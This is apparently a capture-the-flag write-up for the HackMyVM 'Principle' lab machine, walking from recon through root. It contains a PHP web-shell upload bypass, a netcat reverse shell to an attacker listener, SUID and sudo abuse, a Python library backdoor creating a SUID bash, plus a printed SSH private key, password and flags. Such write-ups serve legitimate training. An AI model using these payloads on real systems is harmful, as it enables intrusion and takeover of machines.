# Principle

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.126:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.126
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.22.1
| http-robots.txt: 1 disallowed entry 
|_/hackme
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
```
:::

## HTTP

```bash
└─$ curl http://10.0.2.126/robots.txt
User-agent: *
Allow: /hi.html
Allow: /investigate
Disallow: /hackme
```

```bash
└─$ curl http://10.0.2.126/hi.html
- Who I am?<br>
- You are a automaton<br>
- Are you sure?<br>
- Yep<br>
- Thank you, who has created me?          <br>
- They say Elohim<br>
```

### Fuzzing

```bash
└─$ curl http://10.0.2.126/investigate/
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Principle</title>
</head>
<body>
    <h1 class="h1">The mystery of Talos</h1>
    <div class="center">
        <img class="img" width="750px"  src="talos.jpg" alt="Talos"/>
    </div>
        <p class="p">In Greek mythology, Talos was a giant automaton made of bronze which protected Europa in Crete from pirates and invaders.
He was known to be a gift given to Europa by Zeus himself.
        </p>
</body>
</html>

<!-- If you like research, I will try to help you to solve the enigmas, try to search for documents in this directory -->
```

```bash
└─$ feroxbuster -u http://10.0.2.126/investigate/ --thorough -D -C 404,400,414,500,403 --dont-scan .css,exit.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg -n -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x .php,.txt,.html
200      GET        6l       27w      141c http://10.0.2.126/hi.html
301      GET        7l       11w      169c http://10.0.2.126/investigate => http://10.0.2.126/investigate/
200      GET       23l       94w      812c http://10.0.2.126/investigate/index.html
200      GET        8l        8w      596c http://10.0.2.126/investigate/rainbow_mystery.txt
```

```bash
└─$ curl http://10.0.2.126/investigate/rainbow_mystery.txt
QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi
eSBHb2QgYWZ0ZXIgdGhlIHVuaXZlcnNhbCBGbG9vZC4gSW4gdGhlIGJpYmxpY2FsIGFjY291bnQs
IGl0IHdvdWxkIGFwcGVhciBhcyBhIHNpZ24gb2YgdGhlIGRpdmluZSB3aWxsIGFuZCB0byByZW1p
bmQgbWVuIG9mIHRoZSBwcm9taXNlIG1hZGUgYnkgR29kIGhpbXNlbGYgdG8gTm9haCB0aGF0IGhl
IHdvdWxkIG5ldmVyIGFnYWluIGRlc3Ryb3kgdGhlIGVhcnRoIHdpdGggYSBmbG9vZC4KTWF5YmUg
dGhhdCdzIHdoeSBJIGFtIGEgcm9ib3Q/Ck1heWJlIHRoYXQgaXMgd2h5IEkgYW0gYWxvbmUgaW4g
dGhpcyB3b3JsZD8KClRoZSBhbnN3ZXIgaXMgaGVyZToKLS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0g
Li4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQo=

└─$ curl http://10.0.2.126/investigate/rainbow_mystery.txt -s | base64 -d
According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.
Maybe that's why I am a robot?
Maybe that is why I am alone in this world?

The answer is here:
-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-
```

Decode in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')&input=LS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0gLi4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQ)

![writeup.png](/assets/pentest/hackmyvm/principle/writeup.png)

Message: `DOMAIN T4L0S.HMV`

![writeup-1.png](/assets/pentest/hackmyvm/principle/writeup-1.png)

```bash
└─$ domain='t4l0s.hmv'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -mc all -fs 615
hellfire                [Status: 200, Size: 1659, Words: 688, Lines: 52, Duration: 31ms]
```

![writeup-2.png](/assets/pentest/hackmyvm/principle/writeup-2.png)

There's html comment: `<! You're on the right track, he's getting angry! ->`

### Upload Bypass

```bash
└─$ feroxbuster -u http://hellfire.t4l0s.hmv/ --thorough -D -C 404,400,414,500,403 --dont-scan .css,exit.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET       51l      174w     1659c http://hellfire.t4l0s.hmv/
301      GET        7l       11w      169c http://hellfire.t4l0s.hmv/archivos => http://hellfire.t4l0s.hmv/archivos/
200      GET       51l      174w     1659c http://hellfire.t4l0s.hmv/index.php
200      GET       28l       71w      748c http://hellfire.t4l0s.hmv/upload.php
200      GET       61l      110w     1350c http://hellfire.t4l0s.hmv/output.php
```

![writeup-3.png](/assets/pentest/hackmyvm/principle/writeup-3.png)

```bash
└─$ curl 'http://hellfire.t4l0s.hmv/upload.php' -F 'archivo="GIF89;<?=`$_REQUEST[0]`?>"; type=image/gif; filename=t.php' -Ls | htmlq img
<img alt="Imagen subida" src="archivos/t.php">
```

### RCE

```bash
└─$ curl 'http://hellfire.t4l0s.hmv/archivos/t.php' --data-urlencode '0=id'
GIF89;uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Lateral Movement (talos)

Get reverse shell
```bash
└─$ curl 'http://hellfire.t4l0s.hmv/archivos/t.php' --data-urlencode '0=busybox nc 10.0.2.15 4444 -e /bin/bash'
---
└─$ penelope -p 4444
www-data@principle:~/hellfire.t4l0s.hmv/archivos$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

No sudo, but there are SUID binaries, especially `find`
```bash
www-data@principle:/opt$ find / -perm -4000 -ls 2>/dev/null
    17610     52 -rwsr-xr--   1 root     messagebus    51272 Feb  8  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    26824    640 -rwsr-xr-x   1 root     root         653888 Feb  8  2023 /usr/lib/openssh/ssh-keysign
      368     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn
      371     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd
     2366     60 -rwsr-xr-x   1 root     root          59704 Mar 23  2023 /usr/bin/mount
      372     68 -rwsr-xr-x   1 root     root          68248 Mar 23  2023 /usr/bin/passwd
    31649    276 -rwsr-xr-x   1 root     root         281624 Mar  8  2023 /usr/bin/sudo
     2293    220 -rwsr-xr-x   1 talos    root         224848 Jan  8  2023 /usr/bin/find
     4689     72 -rwsr-xr-x   1 root     root          72000 Mar 23  2023 /usr/bin/su
      369     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh
     2368     36 -rwsr-xr-x   1 root     root          35128 Mar 23  2023 /usr/bin/umount
      598     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp
```

```bash
www-data@principle:/opt$ find /opt -exec bash -p \;
bash-5.2$ id
uid=33(www-data) gid=33(www-data) euid=1000(talos) groups=33(www-data)
```

## Privilege Escalation (elohim)

```bash
bash-5.2$ cat note.txt
Congratulations! You have made it this far thanks to the manipulated file I left you, I knew you would make it!
Now we are very close to finding this false God Elohim.
I left you a file with the name of one of the 12 Gods of Olympus, out of the eye of Elohim ;)
The tool I left you is still your ally. Good luck to you.
```

The 12 Olympians are the principal gods of Greek mythology, residing on Mount Olympus, typically including **Zeus**, **Hera**, **Poseidon**, **Demeter**, **Athena**, **Apollo**, **Artemis**, **Ares**, **Aphrodite**, **Hephaestus**, **Hermes**, and **Dionysus** or **Hestia**, with **Hades** often excluded as ruler of the Underworld, though a significant deity. They are known for their powerful domains, complex family dynamics (often children of Cronus and Rhea, or Zeus by various partners), and human-like flaws, governing aspects of life, nature, and war. 

Hmm.... nothing?
```bash
bash-5.2$ find / \
  -type f \
  \( \
    -iname "*zeus*" -o \
    -iname "*hera*" -o \
    -iname "*poseidon*" -o \
    -iname "*demeter*" -o \
    -iname "*athena*" -o \
    -iname "*apollo*" -o \
    -iname "*artemis*" -o \
    -iname "*ares*" -o \
    -iname "*aphrodite*" -o \
    -iname "*hephaestus*" -o \
    -iname "*hermes*" -o \
    -iname "*dionysus*" -o \
    -iname "*hestia*" \
    -iname "*hades*" \
  \) 2>/dev/null
/usr/lib/modules/6.1.0-9-amd64/kernel/drivers/accessibility/speakup/speakup_apollo.ko
/usr/lib/modules/6.1.0-9-amd64/kernel/drivers/power/supply/cros_peripheral_charger.ko
/usr/share/zoneinfo/Europe/Bucharest
/usr/share/zoneinfo/Antarctica/Rothera
/usr/share/zoneinfo/right/Europe/Bucharest
/usr/share/zoneinfo/right/Antarctica/Rothera
/usr/share/terminfo/a/apollo_15P
/usr/share/terminfo/a/apollo
/usr/share/terminfo/a/apollo_color
/usr/share/terminfo/a/apollo_19L
/usr/share/terminfo/a/apollo+vt132
```

The box contained some Spanish words, so maybe searching in English is incorrect?
```bash
bash-5.2$ find / \
  -type f \
  \( \
    -iname "*zeus*" -o \
    -iname "*hera*" -o \
    -iname "*poseidón*" -o \
    -iname "*poseidon*" -o \
    -iname "*deméter*" -o \
    -iname "*demeter*" -o \
    -iname "*atenea*" -o \
    -iname "*apolo*" -o \
    -iname "*artemisa*" -o \
    -iname "*ares*" -o \
    -iname "*afrodita*" -o \
    -iname "*hefesto*" -o \
    -iname "*hermes*" -o \
    -iname "*dionisio*" -o \
    -iname "*hestia*" \
    -iname "*hades*" \
  \) 2>/dev/null
/etc/selinux/Afrodita.key
/usr/lib/modules/6.1.0-9-amd64/kernel/drivers/power/supply/cros_peripheral_charger.ko
/usr/share/zoneinfo/Europe/Bucharest
/usr/share/zoneinfo/Antarctica/Rothera
/usr/share/zoneinfo/right/Europe/Bucharest
/usr/share/zoneinfo/right/Antarctica/Rothera
```

```bash
bash-5.2$ cat /etc/selinux/Afrodita.key
Here is my password:
Hax0rModeON

Now I have done another little trick to help you reach Elohim.
REMEMBER: You need the access key and open the door. Anyway, he has a bad memory and that's why he keeps the lock coded and hidden at home.
```

I noticed before port 3445 was open and when I tried to `curl` it it had SSH banner as error. So SSH is running on port 3445 internally.
```bash
bash-5.2$ ss -tunlp4
Netid    State      Recv-Q     Send-Q         Local Address:Port         Peer Address:Port    Process
udp      UNCONN     0          0                    0.0.0.0:68                0.0.0.0:*
tcp      LISTEN     0          128                  0.0.0.0:3445              0.0.0.0:*
tcp      LISTEN     0          511                  0.0.0.0:80                0.0.0.0:*
bash-5.2$ busybox nc 0 3445
SSH-2.0-OpenSSH_9.2p1 Debian-2
^C

bash-5.2$ cat /etc/ssh/sshd_config | grep -vE '#|^$'
Include /etc/ssh/sshd_config.d/*.conf
Port 3445
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
Match User elohim
        ForceCommand bash -r
```

Users:
```bash
bash-5.2$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
talos:x:1000:1000:Talos,,,:/home/talos:/bin/bash
elohim:x:1001:1001::/home/gehenna:/bin/rbash
sml:x:1002:1002::/home/sml:/bin/bash
```

Errrr... wot. When using `ssh` binary you get this error.
```bash
bash-5.2$ ssh
bash: /usr/bin/ssh: Permission denied
```

The password was actually for the talos user
```bash
bash-5.2$ su - talos
Password:
talos@principle:~$ id
uid=1000(talos) gid=1000(talos) groups=1000(talos),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

::: info Creds
`talos:Hax0rModeON`
:::

```bash
talos@principle:~$ sudo -l
Matching Defaults entries for talos on principle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User talos may run the following commands on principle:
    (elohim) NOPASSWD: /bin/cp
```

`id_rsa` exists, but we can't seem to use it
```bash
talos@principle:~$ sudo -u elohim cp /home/gehenna/.ssh/id_rsa /dev/stdout
-----BEGIN OPENSSH PRIVATE KEY-----
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
rZH/nyDF8gMh3RV9HIJPto8+izE=
-----END OPENSSH PRIVATE KEY-----

talos@principle:~$ sudo -u elohim cp /home/gehenna/.ssh/id_rsa /tmp/id_rsa.gehenna
talos@principle:~$ ./ssh 0 -p 3445 -i /tmp/id_rsa.gehenna -l gehenna
Load key "/tmp/id_rsa.gehenna": Permission denied
gehenna@0.0.0.0 password:

talos@principle:~$ chmod 600 /tmp/id_rsa.gehenna
chmod: changing permissions of '/tmp/id_rsa.gehenna': Operation not permitted
################################################################################
# Even creating new file, pasting, chmod 600 and connecting didn't do anything #
################################################################################
```

`elohim` owns `/home/gehenna` so we can copy there
```bash
talos@principle:~$ ls /home -Alh
total 8.0K
drwxr-xr-x 4 elohim elohim 4.0K Jul 14  2023 gehenna
drwxr-xr-x 4 talos  talos  4.0K Dec  8 06:28 talos
```

Create SSH keys and copy
```bash
talos@principle:~$ ssh-keygen -f id_rsa -P x -q
talos@principle:~$ sudo -u elohim cp id_rsa.pub /home/gehenna/.ssh/authorized_keys
```

For SSH we can actually copy the binary and make it executable
```bash
talos@principle:~$ cp /usr/bin/ssh .
talos@principle:~$ chmod +x ssh
talos@principle:~$ ./ssh 0 -p 3445 -i id_rsa -l gehenna
gehenna@0.0.0.0 password:
```

Authentication with public key still fails.

Im stopid, the username we should use is `elohim`!
```bash
talos@principle:~$ ssh-keygen -f id_rsa -P x -q
talos@principle:~$ sudo -u elohim cp id_rsa.pub /home/gehenna/.ssh/authorized_keys
talos@principle:~$ ./ssh 0 -p 3445 -i id_rsa -l elohim
Enter passphrase for key 'id_rsa': x

Son, you did not listen to me, and now you are trapped.
You have come a long way, but this is the end of your journey.

elohim@principle:~$ id
uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
```

### User.txt

```bash
elohim@principle:~$ rev flag.txt | rev
                           _
                          _)\.-.
         .-.__,___,_.-=-. )\`  a`\_
     .-.__\__,__,__.-=-. `/  \     `\
     {~,-~-,-~.-~,-,;;;;\ |   '--;`)/
      \-,~_-~_-,~-,(_(_(;\/   ,;/
       ",-.~_,-~,-~,)_)_)'.  ;;(
         `~-,_-~,-~(_(_(_(_\  `;\
   ,          `"~~--,)_)_)_)\_   \
   |\              (_(_/_(_,   \  ;
   \ '-.       _.--'  /_/_/_)   | |
    '--.\    .'          /_/    | |
        ))  /       \      |   /.'
       //  /,        | __.'|  ||
      //   ||        /`    (  ||
     ||    ||      .'       \ \\
     ||    ||    .'_         \ \\
      \\   //   / _ `\        \ \\__
       \'-'/(   _  `\,;        \ '--:,
        `"`  `"` `-,,;         `"`",,;


CONGRATULATIONS, you have defeated me!

The flag is:
K|tW4bw7$zNh'PwSh/jN
```

## Privilege Escalation

`cat` is acting odd
```bash
elohim@principle:~$ cat .lock
rbash: cat:: No such file or directory

# Quick fix
elohim@principle:~$ cat2() { rev $1 | rev; }
elohim@principle:~$ cat2 .lock
7072696e6369706c6573
```

There was something about a lock (?). Whatever it is.
```bash
elohim@principle:~$ rev .lock | rev
7072696e6369706c6573
---
└─$ echo 7072696e6369706c6573 | xxd  -r -p
principles
```

```bash
elohim@principle:~$ sudo -l
Matching Defaults entries for elohim on principle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User elohim may run the following commands on principle:
    (root) NOPASSWD: /usr/bin/python3 /opt/reviewer.py
```

```python
elohim@principle:~$ cat2 /opt/reviewer.py
#!/usr/bin/python3
import os
import subprocess

def delete_bad_files(directory):
    valid_extensions = ['.jpg', '.png', '.gif']

    for file_name in os.listdir(directory):
        file = os.path.join(directory, file_name)
        if os.path.isfile(file):
            _, extension = os.path.splitext(file)
            if extension.lower() not in valid_extensions:
                os.remove(file)
                print(f"Deleted file: {file}")

directory = '/var/www/hellfire.t4l0s.hmv/files'

delete_bad_files(directory)

def send_message_connected_users():
    proceso = subprocess.Popen(['who'], stdout=subprocess.PIPE)
    output, _ = proceso.communicate()
    user_list = output.decode().strip().split('\n')
    connected_users = [user.split()[0] for user in user_list]
    message = f"I have detected an intruder, stealing accounts: {', '.join(connected_users)}"
    subprocess.run(['wall', message])

send_message_connected_users()
```

Bash was very funky, most likely some selinux restrictions, but not on `sh`.

We are also part of `sml` group, if we find any related writable files we get that `subprocess` is writable (for whatever reason...)
```bash
elohim@principle:~$ sh -c 'find / -user sml -writable 2>/dev/null'
elohim@principle:~$ sh -c 'find / -group sml -writable -ls 2>/dev/null'
    19941     84 -rw-rw-r--   1 root     sml         85745 Jul 11  2023 /usr/lib/python3.11/subprocess.py
```

Use `sh` for redirection and just wait for cronjob (make sure file is uploaded on webserver for it to trigger commands).
```bash
$ echo '__import__("os").system("install -m4777 /bin/bash /tmp/rootbash")' >> /usr/lib/python3.11/subprocess.py
```

```bash
$ /tmp/rootbash -p
rootbash-5.2# id
uid=1001(elohim) gid=1001(elohim) euid=0(root) groups=1001(elohim),1002(sml)
```

### Root.txt

```
rootbash-5.2# cat /root/root.txt
CONGRATULATIONS, the system has been pwned!

          _______
        @@@@@@@@@@@
      @@@@@@@@@@@@@@@
     @@@@@@@222@@@@@@@
    (@@@@@/_____\@@@@@)
     @@@@(_______)@@@@
      @@@{ " L " }@@@
       \@  \ - /  @/
        /    ~    \
      / ==        == \
    <      \ __ /      >
   / \          |    /  \
 /    \       ==+==       \
|      \     ___|_         |
| \//~~~|---/ * ~~~~  |     }
{  /|   |-----/~~~~|  |    /
 \_ |  /           |__|_ /


+wP"y8z3TcDqO!&a*rg/
```